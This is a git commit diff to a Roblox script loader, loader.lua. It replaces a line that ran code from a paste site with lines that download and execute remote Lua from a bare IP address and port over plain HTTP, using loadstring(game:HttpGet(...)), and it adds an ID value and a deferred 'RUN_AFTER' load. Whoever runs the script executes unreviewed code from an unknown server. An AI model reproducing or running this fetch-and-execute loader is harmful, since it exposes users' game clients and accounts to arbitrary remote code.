d08bec2badbb3191ad288a0702dd40bff2be400e
RobloxScriptsV2 <mernaif3@gmail.com>
2025-12-11 09:27:52 +0800

    loader.lua

--- loader.lua
+++ loader.lua
@@ -1,1 +1,4 @@
-loadstring(game:HttpGet("https://pastefy.app/hHSNiEz5/raw"))()
+ID="4c78314a-bc55-43c0-9947-1c9db37afdab"
+RUN_AFTER=loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"));
+
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
